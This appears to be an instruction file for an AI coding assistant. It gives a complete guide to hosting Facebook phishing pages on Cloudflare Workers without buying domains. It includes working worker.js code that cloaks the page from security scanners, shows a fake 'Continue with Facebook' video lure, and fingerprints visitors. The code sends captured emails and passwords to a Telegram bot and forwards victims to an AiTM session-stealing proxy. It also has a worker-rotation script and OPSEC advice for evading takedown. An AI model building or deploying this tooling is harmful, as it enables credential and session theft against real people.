---
trigger: model_decision
description: "TAGS: [redteam,cloudflare,workers,serverless,hosting,no-domain] | TRIGGERS: cloudflare,worker,serverless,no-domain,free-hosting | SCOPE: infrastructure | DESCRIPTION: Cloudflare Workers hosting to avoid domain purchase and flagging"
globs:
---
# Cloudflare Workers Hosting Module

## Scope
Use Cloudflare Workers to host phishing pages WITHOUT purchasing domains.

## Why Cloudflare Workers?

### Advantages
1. **No domain purchase needed** - Uses `*.workers.dev` subdomain
2. **Trusted reputation** - cloudflare.com is whitelisted
3. **Serverless** - No fixed IP to blacklist
4. **Free tier** - 100k requests/day
5. **Edge deployment** - Fast worldwide
6. **Automatic SSL** - HTTPS by default

### vs Purchased Domains
| Aspect | Purchased Domain | CF Workers |
|--------|-----------------|------------|
| Cost | $10-50/year | FREE |
| Flagging risk | HIGH | LOW |
| Setup time | Days (warming) | Minutes |
| IP exposure | Fixed VPS IP | CF Edge |
| SSL | Manual (certbot) | Automatic |

## Complete Worker Implementation

### worker.js - Full Phishing Worker
```javascript
/**
 * Cloudflare Worker - Phishing Template Host
 * Deploy: wrangler deploy
 * URL: https://your-name.workers.dev/
 */

// Configuration
const CONFIG = {
  TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN',
  TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID',
  REDIRECT_URL: 'https://www.facebook.com/',
  EVILPANEL_URL: 'https://your-aitm-domain.com/',
};

// Cloaking - Scanner patterns
const SCANNER_PATTERNS = [
  'googlebot', 'bingbot', 'facebookexternalhit', 'facebot',
  'twitterbot', 'linkedinbot', 'safebrowsing', 'crawl',
  'spider', 'bot', 'scan', 'check', 'validator', 'lighthouse',
  'pagespeed', 'curl', 'wget', 'python', 'httpclient', 'java'
];

const SCANNER_IP_PREFIXES = [
  '66.249.', '66.102.', '64.233.', '72.14.',  // Google
  '207.46.', '157.55.', '40.77.',             // Bing
  '173.252.', '31.13.', '157.240.',           // Facebook
  '52.', '54.',                                // AWS
  '35.184.', '35.192.'                         // GCP
];

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // Route handling
    if (path === '/api/capture' && request.method === 'POST') {
      return handleCapture(request, env);
    }
    
    if (path === '/api/fingerprint' && request.method === 'POST') {
      return handleFingerprint(request, env);
    }
    
    // Cloaking check
    if (isScanner(request)) {
      return serveBenignPage();
    }
    
    // Serve phishing page
    return servePhishingPage();
  }
};

function isScanner(request) {
  const ua = (request.headers.get('User-Agent') || '').toLowerCase();
  const ip = request.headers.get('CF-Connecting-IP') || '';
  
  // Check UA
  for (const pattern of SCANNER_PATTERNS) {
    if (ua.includes(pattern)) {
      return true;
    }
  }
  
  // Check IP prefix
  for (const prefix of SCANNER_IP_PREFIXES) {
    if (ip.startsWith(prefix)) {
      return true;
    }
  }
  
  return false;
}

function serveBenignPage() {
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - News Portal</title>
    <meta name="description" content="Your source for the latest news and updates">
    <meta property="og:title" content="News Portal - Breaking News">
    <meta property="og:description" content="Stay updated with the latest news">
    <meta property="og:type" content="website">
</head>
<body style="font-family: sans-serif; max-width: 800px; margin: 0 auto; padding: 20px;">
    <h1>Welcome to News Portal</h1>
    <p>Thank you for visiting. Our content is being updated.</p>
    <p>Please check back later for the latest news and articles.</p>
    <footer style="margin-top: 40px; color: #666;">
        <p>&copy; 2025 News Portal. All rights reserved.</p>
    </footer>
</body>
</html>`;
  
  return new Response(html, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8',
      'Cache-Control': 'no-cache'
    }
  });
}

function servePhishingPage() {
  // Your phishing HTML template here
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Video Now - Watch</title>
    <meta name="robots" content="noindex,nofollow">
    <meta name="theme-color" content="#1877f2">
    
    <!-- Facebook OG tags for preview -->
    <meta property="og:title" content="Viral Video - Must Watch!">
    <meta property="og:description" content="You won't believe what happens next...">
    <meta property="og:image" content="https://static.wixstatic.com/media/preview.png">
    <meta property="og:type" content="video.other">
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
            text-align: center;
        }
        .video-preview {
            position: relative;
            width: 100%;
            aspect-ratio: 9/16;
            background: linear-gradient(135deg, #1a1a1a, #333);
            border-radius: 16px;
            margin-bottom: 20px;
            overflow: hidden;
        }
        .play-btn {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80px;
            height: 80px;
            background: rgba(255,255,255,0.9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
        .play-btn::after {
            content: '';
            border-left: 30px solid #1877f2;
            border-top: 18px solid transparent;
            border-bottom: 18px solid transparent;
            margin-left: 8px;
        }
        .cta-btn {
            width: 100%;
            padding: 16px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .cta-btn:hover { background: #166fe5; }
        .fb-icon {
            width: 24px;
            height: 24px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .fb-icon svg { width: 14px; fill: #1877f2; }
        .text { color: #fff; margin-top: 16px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="video-preview">
            <img src="https://static.wixstatic.com/media/thumbnail.jpg" 
                 style="width:100%;height:100%;object-fit:cover;">
            <div class="play-btn"></div>
        </div>
        
        <button class="cta-btn" onclick="handleCTA()">
            <span class="fb-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
            </span>
            Continue with Facebook
        </button>
        
        <p class="text">Sign in to watch this video</p>
    </div>
    
    <script>
        // Fingerprint collection
        (async function() {
            const fp = {
                ua: navigator.userAgent,
                lang: navigator.language,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touch: navigator.maxTouchPoints,
                ts: Date.now()
            };
            
            await fetch('/api/fingerprint', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fp)
            }).catch(() => {});
        })();
        
        function handleCTA() {
            // Redirect to AiTM proxy or Facebook
            const targetUrl = '${CONFIG.EVILPANEL_URL}';
            window.location.href = targetUrl;
        }
    </script>
</body>
</html>`;
  
  return new Response(html, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      // Remove security headers
      'X-Frame-Options': '',
      'Content-Security-Policy': ''
    }
  });
}

async function handleCapture(request, env) {
  try {
    const formData = await request.formData();
    const email = formData.get('email') || formData.get('username') || '';
    const password = formData.get('pass') || formData.get('password') || '';
    
    if (email && password) {
      const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
      const ua = request.headers.get('User-Agent') || 'unknown';
      const country = request.headers.get('CF-IPCountry') || 'unknown';
      
      // Send to Telegram
      await sendTelegram(
        `🔑 <b>Credentials Captured!</b>\n\n` +
        `📧 Email: <code>${email}</code>\n` +
        `🔐 Pass: <code>${password}</code>\n` +
        `🌍 IP: <code>${ip}</code>\n` +
        `🏳️ Country: ${country}\n` +
        `📱 UA: ${ua.substring(0, 50)}...`
      );
    }
    
    // Redirect to real Facebook
    return Response.redirect(CONFIG.REDIRECT_URL, 302);
    
  } catch (e) {
    return Response.redirect(CONFIG.REDIRECT_URL, 302);
  }
}

async function handleFingerprint(request, env) {
  try {
    const data = await request.json();
    const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
    
    // Store or send fingerprint
    await sendTelegram(
      `📱 <b>Fingerprint Collected</b>\n\n` +
      `IP: ${ip}\n` +
      `Screen: ${data.screen}\n` +
      `Platform: ${data.platform}\n` +
      `Timezone: ${data.tz}`
    );
    
    return new Response(JSON.stringify({ ok: true }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (e) {
    return new Response(JSON.stringify({ ok: false }), {
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

async function sendTelegram(message) {
  const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CONFIG.TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    })
  }).catch(() => {});
}
```

## Deployment Steps

### 1. Install Wrangler CLI
```bash
npm install -g wrangler
```

### 2. Authenticate
```bash
wrangler login
# Opens browser to login to Cloudflare
```

### 3. Create Project
```bash
mkdir phish-worker && cd phish-worker
wrangler init
```

### 4. Configure wrangler.toml
```toml
name = "video-share"  # Becomes video-share.workers.dev
main = "src/worker.js"
compatibility_date = "2024-01-01"

[vars]
TELEGRAM_BOT_TOKEN = "your-bot-token"
TELEGRAM_CHAT_ID = "your-chat-id"
```

### 5. Deploy
```bash
wrangler deploy
# Output: https://video-share.your-subdomain.workers.dev
```

## URL Strategies

### Random Subdomain
```bash
# Each deploy can use different name
wrangler deploy --name "news-$(date +%s)"
# Result: news-1701234567.workers.dev
```

### Custom Domain (If Needed)
```bash
# Add custom domain via Cloudflare dashboard
# Still uses CF infrastructure, but own domain
# Better for persistent campaigns
```

## Integration with MaxPhisher

### Set Worker URL as EVILPANEL_URL
```bash
# In template's index.php
export EVILPANEL_URL="https://video-share.workers.dev/"
```

### Worker → AiTM Proxy Flow
```
1. Victim clicks shared link (Worker URL)
2. Worker serves phishing template
3. User clicks "Continue with Facebook"
4. Redirects to AiTM proxy (separate VPS)
5. AiTM captures session tokens
```

## Rotation Strategy

### Automated Deployment Script
```bash
#!/bin/bash
# rotate_worker.sh - Deploy new worker every 2 hours

while true; do
    NAME="vid-$(date +%s | tail -c 6)"
    
    # Deploy with new name
    wrangler deploy --name "$NAME"
    
    # Get URL
    URL="https://${NAME}.${CF_SUBDOMAIN}.workers.dev"
    
    # Distribute URL (Telegram, etc.)
    curl -s "https://api.telegram.org/bot${BOT}/sendMessage" \
        -d "chat_id=${CHAT}" \
        -d "text=New URL: $URL"
    
    # Wait 2 hours
    sleep 7200
    
    # Delete old worker (optional)
    wrangler delete --name "$PREV_NAME" -f 2>/dev/null
    PREV_NAME="$NAME"
done
```

## OPSEC Considerations

1. **Use different Cloudflare accounts** for different campaigns
2. **Don't link to personal email** - Use burner accounts
3. **Rotate workers frequently** - Every few hours
4. **Use descriptive but benign names** - news-share, video-now, link-preview
5. **Don't hardcode credentials** - Use environment variables
